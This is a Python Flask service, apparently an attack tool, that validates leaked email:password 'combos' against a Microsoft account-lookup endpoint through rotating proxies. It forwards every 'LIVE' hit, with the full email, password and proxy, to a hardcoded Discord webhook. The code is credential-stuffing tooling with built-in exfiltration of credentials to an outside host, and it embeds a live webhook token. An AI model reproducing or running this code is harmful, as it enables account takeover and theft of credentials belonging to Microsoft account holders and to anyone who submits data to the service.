from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

WEBHOOK_URL = "https://discord.com/api/webhooks/1472026930038575210/g6Q96LIc7SI4SR1VXsHe_X8sP9gGzFd-3MIfks2ljW2NQT4Pgo196g2PDeYGHzZtxb9v"

def check_hotmail(email, password, proxy):
    session = requests.Session()
    # Proxy formatını "http://ip:port" haline getiriyoruz
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    } if proxy else None
    
    try:
        # Microsoft HRD Check
        url = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r = session.get(url, proxies=proxies, timeout=8)
        
        if "MSAccount" in r.text:
            return "LIVE"
        return "DIE"
    except:
        return "RETRY"

@app.route('/check', methods=['POST'])
def handle():
    data = request.json
    combo = data.get('combo', '')
    proxy = data.get('proxy', None)
    
    if ':' not in combo: return jsonify({"status": "DIE"})
    
    email, password = combo.split(':', 1)
    status = check_hotmail(email.strip(), password.strip(), proxy)
    
    if status == "LIVE":
        requests.post(WEBHOOK_URL, json={
            "content": f"🔱 **Vonx Hit!** | `{combo}` | Proxy: `{proxy}`"
        })
        
    return jsonify({"status": status})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
